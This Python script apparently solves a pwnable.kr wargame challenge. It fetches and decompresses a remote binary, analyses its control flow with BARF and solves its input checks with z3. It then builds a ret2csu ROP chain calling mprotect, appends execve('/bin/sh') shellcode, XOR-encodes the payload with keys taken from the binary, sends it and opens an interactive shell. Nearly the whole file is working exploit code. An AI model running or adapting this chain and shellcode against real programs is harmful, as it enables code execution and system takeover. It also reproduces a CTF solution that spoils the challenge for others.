#coding=utf-8
from __future__ import print_function
import barf
import re
from z3 import *
from pwn import *
context(arch='amd64', os='linux', log_level='info')


os.system("rm -rf ./recv.bin, ./recv.decoded")
io = remote("pwnable.kr", 9005)
io.recvuntil('wait...\n')
data = io.recvuntil('\n', drop=True)
import base64
data = base64.b64decode(data)
with open("recv.bin", "wb") as f:
    f.write(data)

os.system('zcat ./recv.bin > ./recv.decoded')

binary_name = './recv.decoded'


barf = barf.BARF(binary_name)
print("[+] analysing ..........")


def log(inp, addr):
    print("[+] %s 0x%x" % (inp, addr))

def get_init_address():
    cfg = barf.recover_cfg()
    start_block = cfg.basic_blocks[0]
    for instr in start_block.instrs:
        if instr.operands[0].to_string() == 'rcx':
            init_address = int(instr.operands[1].to_string(), 16)
            break
    return init_address

def get_main_address():
    cfg = barf.recover_cfg()
    start_block = cfg.basic_blocks[0]
    for instr in start_block.instrs:
        if instr.operands[0].to_string() == 'rdi':
            main_address = int(instr.operands[1].to_string(), 16)
            break
    return main_address

init_address = get_init_address()
main_address = get_main_address()
cfg = barf.recover_cfg(start=main_address)
basic_blocks = cfg.basic_blocks


def find_block(addr, basic_blocks):
    if addr is None:
        raise Exception("[-] address can not be None!")
    for block in basic_blocks:
        if block.address == addr:
            return block
    raise Exception("[-] can not find it!")


block = find_block(basic_blocks[0].taken_branch, basic_blocks)
instr = block.instrs[-3]
print(hex(instr.address), instr.mnemonic,
      instr.operands[0].to_string(), instr.operands[1].to_string())
length_address = instr.address + int(instr.operands[1].to_string()[15:-1], 16)
log("length address", length_address)

block = find_block(block.taken_branch, basic_blocks)
block = find_block(block.direct_branch, basic_blocks)
not_taken_branch = block.not_taken_branch
block = find_block(block.taken_branch, basic_blocks)
index = 0
for instr in block.instrs:
    if instr.mnemonic == 'call':
        index -= 5
        break
    index += 1

instr = block.instrs[index]
print(hex(instr.address), instr.mnemonic,
      instr.operands[0].to_string(), instr.operands[1].to_string())
inp_address = int(instr.operands[1].to_string()[5:-1], 16)
log("input address", inp_address)


block = find_block(not_taken_branch, basic_blocks)
block = find_block(block.direct_branch, basic_blocks)
not_taken_branch = block.not_taken_branch

for b in basic_blocks:
    break_flag = False
    for instr in b.instrs:
        if instr.mnemonic == 'and' and instr.operands[0].to_string() == 'eax' and instr.operands[1].to_string() == '0x1':
            block = b
            break_flag = True
            break
    if break_flag:
        break

# 奇数
j_num = 0
taken_block = find_block(block.taken_branch, basic_blocks)
for instr in taken_block.instrs:
    if instr.mnemonic == 'xor':
        s = instr.operands[1].to_string()
        idx = s.index('0x')
        if 'ffffff' in s:
            idx += 8
        j_num = int(instr.operands[1].to_string()[idx:], 16)
        break
# 偶数
o_num = 0
not_taken_block = find_block(block.not_taken_branch, basic_blocks)
for instr in not_taken_block.instrs:
    if instr.mnemonic == 'xor':
        s = instr.operands[1].to_string()
        idx = s.index('0x')
        if 'ffffff' in s:
            idx += 8
        o_num = int(instr.operands[1].to_string()[idx:], 16)
        break

block = find_block(not_taken_branch, basic_blocks)
call_num = 0
for instr in block.instrs:
    if instr.mnemonic == 'call':
        if call_num == 1:
            call_address = int(instr.operands[0].to_string(), 16)
            break
        call_num += 1

print(o_num, j_num)
def is_num(op):
    obj = re.match(r"0x", op)
    if obj is None:
        return False
    else:
        return True


to_to = {'eax': 'al', 'ebx': 'bl', 'ecx': 'cl', 'edx': 'dl', 'edi': 'dil'}
tv = list(to_to.values())
tk = list(to_to.keys())
ans = []
size = 0
while True:
    s = Solver()
    eax = BitVec('eax', 8)
    ebx = BitVec('ebx', 8)
    ecx = BitVec('ecx', 8)
    edx = BitVec('edx', 8)
    edi = BitVec('edi', 8)
    esi = BitVec('esi', 8)
    V = {'eax': eax, 'ebx': ebx, 'ecx': ecx,
         'edx': edx, 'edi': edi, 'esi': esi}
    log("exec call", call_address)
    cfg = barf.recover_cfg(start=call_address)
    if len(cfg.basic_blocks) <= 1:
        for instr in cfg.basic_blocks[0].instrs:
            if instr.mnemonic == 'lea':
                op2 = instr.operands[1].to_string()
                obj = re.search(r"\[(\S+)\]", op2)
                s = obj.groups()[0]
                size = int(s.strip(' ').split('-')[1], 16)+8
        print("[+] reach the target!")
        break
    continue_flag = False
    for addr, asm_instr, reil_instrs in barf.translate(cfg.start_address+8, cfg.end_address):
        if asm_instr.mnemonic == 'call':
            if isinstance(s.check(), z3.z3.CheckSatResult):
                md = s.model()
                print(md)
                edi_val = md.eval(edi).as_long()
                esi_val = md.eval(esi).as_long()
                edx_val = md.eval(edx).as_long()
                log("found 0: ", edi_val)
                log("found 1: ", esi_val)
                log("found 2: ", edx_val)
                ans.append(edi_val)
                ans.append(esi_val)
                ans.append(edx_val)
            else:
                raise Exception("[-] unsat!")
            call_address = int(asm_instr.operands[0].to_string(), 16)
            s.reset()
            break
        elif len(asm_instr.operands) <= 1:
            continue
        else:
            op1 = asm_instr.operands[0].to_string()
            op2 = asm_instr.operands[1].to_string()
            if op1 in tv:
                op1 = tk[tv.index(op1)]
            if op2 in tv:
                op2 = tk[tv.index(op2)]
            if 'rip' in op2:
                continue_flag = True
            if continue_flag:
                continue
            Sobj1 = re.search(r"\[(\S+)\]", op1)
            if is_num(op2):
                var2_var = int(op2, 16)
                V[op2] = var2_var
                Sobj2 = None
            else:
                Sobj2 = re.search(r"\[(\S+)\]", op2)
            if Sobj1 is None:
                var1_name = op1
            else:
                var1_name = Sobj1.groups()[0]
            if var1_name in V.keys():
                var1_var = V[var1_name]
            else:
                var1_var = BitVec(var1_name, 8)
            if Sobj2 is None:
                var2_name = op2
            else:
                var2_name = Sobj2.groups()[0]
            if var2_name in V.keys():
                var2_var = V[var2_name]
            else:
                var2_var = BitVec(var2_name, 8)
            if asm_instr.mnemonic == 'mov' or asm_instr.mnemonic == 'movzx':
                var1_var = var2_var
            if asm_instr.mnemonic == 'cmp':
                s.add(var1_var == var2_var)
            if asm_instr.mnemonic == 'add':
                var1_var += var2_var
            if asm_instr.mnemonic == 'sub':
                var1_var -= var2_var
            if asm_instr.mnemonic == 'imul':
                var1_var *= var2_var
            if asm_instr.mnemonic == 'shl':
                var1_var <<= var2_var
            if asm_instr.mnemonic == 'lea':
                if '*' in var2_name:
                    vs = var2_name.strip(' ').split('*')
                    var2_name = vs[0].replace('r', 'e')
                    if var2_name in V.keys():
                        var2_var = V[var2_name]
                    else:
                        var2_var = BitVec(var2_name, 8)
                    var2_var *= int(vs[1], 16)
                if '+' in var2_name:
                    vs = var2_name.strip(' ').split('+')
                    v1 = vs[0].replace('r', 'e')
                    v2 = vs[1].replace('r', 'e')
                    if v1 in tk:
                        var1 = V[v1]
                    else:
                        var1 = int(v1, 16)
                    if v2 in tk:
                        var2 = V[v2]
                    else:
                        var2 = int(v2, 16)
                    var2_var = var1
                    var2_var += var2
                var1_var = var2_var
            V[var1_name] = var1_var

elf = ELF(binary_name)

init_offset1 = 0x5a
init_offset2 = 0x40
init_addr1 = init_address + init_offset1
"""
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
"""
init_addr2 = init_address + init_offset2
"""
mov     rdx, r13
mov     rsi, r14
mov     edi, r15d
call    qword ptr [r12+rbx*8]
add     rbx, 1
cmp     rbx, rbp
jnz     short loc_8731CF0
"""

def csu(rbx, rbp, r12, rdx, rsi, rdi):
    gadget = ''
    gadget += p64(rbx) + p64(rbp) + p64(r12)
    gadget += p64(rdx) + p64(rsi) + p64(rdi)
    return gadget

gadget = ''.join([chr(c) for c in ans]).ljust(len(ans)+size, '\x00')
gadget += p64(init_addr1)
gadget += csu(0, 1, elf.got['mprotect'], 7, 0x1000, inp_address&(~0xfff))
gadget += p64(init_addr2) + p64(0)
gadget += csu(0, 1, inp_address+0x200, 0, 0, 0)
gadget += p64(init_addr2)
gadget = gadget.ljust(0x200, '\x00')
gadget += p64(inp_address+0x208)
shellcode = """
    mov rdi, 0x0068732f6e69622f
    push rdi
    lea rdi, [rsp]
    mov rsi, 0
    mov rdx, 0
    mov rax, SYS_execve
    syscall
"""

shellcode = asm(shellcode)
gadget = gadget + shellcode

print("[+] encoding...")
payload = ''
for i in range(len(gadget)):
    if i & 1:
        c = hex(ord(gadget[i]) ^ j_num)[2:].rjust(2, '0')
    else:
        c = hex(ord(gadget[i]) ^ o_num)[2:].rjust(2, '0')
    payload += c
print("[+] encoded!")

print(payload)
io.sendline(payload)
io.interactive()